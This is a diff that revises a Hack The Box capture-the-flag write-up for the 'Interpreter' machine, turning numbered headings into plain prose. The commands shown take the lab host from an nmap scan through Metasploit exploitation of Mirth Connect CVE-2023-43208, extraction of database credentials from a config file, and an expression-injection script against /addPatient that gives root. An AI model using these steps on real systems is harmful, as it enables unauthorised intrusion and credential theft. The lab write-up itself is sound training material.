@@ -8,9 +8,9 @@ image:
     path: assets/img/htb/interpreter/banner.png
 ---
 
-## 1/ Reconnaissance
+## Recon
 
-### 1.1 Port and service enumeration
+Let's scan the ports and services.
 
 ```
 nmap -Pn -sC -sV 10.129.244.184
@@ -20,7 +20,7 @@ nmap -Pn -sC -sV 10.129.244.184
 443/tcp  open  https
 ```
 
-### 1.2 Confirm Mirth Connect version leak
+The `webstart.jnlp` file leaks the Mirth Connect version:
 
 ```
 curl -sk https://10.129.244.184/webstart.jnlp | head -n 40
@@ -28,11 +28,9 @@ curl -sk https://10.129.244.184/webstart.jnlp | head -n 40
 ... Mirth Connect 4.4.0 ...
 ```
 
-## 2/ Initial Foothold (CVE-2023-43208)
+## Foothold
 
-### 2.1 Metasploit resource script
-
-Using `Metaploit`:
+Mirth Connect 4.4.0 is vulnerable to CVE-2023-43208. I used `Metasploit` with these settings:
 
 ```
 use exploit/multi/http/mirth_connect_cve_2023_43208
@@ -45,15 +43,13 @@ set VERBOSE true
 run
 ```
 
-Run it:
+Then run it from a resource script:
 
 ```
 msfconsole -q -r msf_cve_2023_43208.rc
 ```
 
-### 2.2 Verify foothold
-
-In obtained shell:
+In the shell we got:
 
 ```
 id
@@ -61,9 +57,9 @@ id
 uid=103(mirth) gid=103(mirth) groups=103(mirth)
 ```
 
-## 3/ Enumeration as `mirth`
+## Enumeration as `mirth`
 
-### 3.1 Listening local services
+First, the services listening locally:
 
 ```
 ss -lntp
@@ -71,7 +67,8 @@ ss -lntp
 LISTEN 0 128 127.0.0.1:54321 ...
 ```
 
-### 3.2 Extract Mirth DB credentials
+Next, the Mirth database credentials from the config file:
+
 ```
 cat /usr/local/mirthconnect/conf/mirth.properties | rg "database\.(username|password)"
 
@@ -79,15 +76,15 @@ database.username = mirthdb
 database.password = MirthPass123!
 ```
 
-### 3.3 Validate internal endpoint behavior
+Port 54321 is only on localhost, so let's look at it:
 
 ```bash
 curl -s http://127.0.0.1:54321/addPatient
 ```
 
-## 4/ Privilege Escalation via `/addPatient` Expression Injection
+## Root
 
-### 4.1 Generic expression-eval
+The `/addPatient` endpoint evaluates the expression we put inside `{...}` in the patient data. This script sends any expression we give it:
 
 ```python
 #!/usr/bin/env python3
@@ -136,7 +133,7 @@ if __name__ == "__main__":
     raise SystemExit(main())
 ```
 
-### 4.2 Exploit with the script
+Now we run `id` through it, and it comes back as root:
 
 ```
 python3 /home/x/Downloads/poc/addpatient_eval_poc.py \
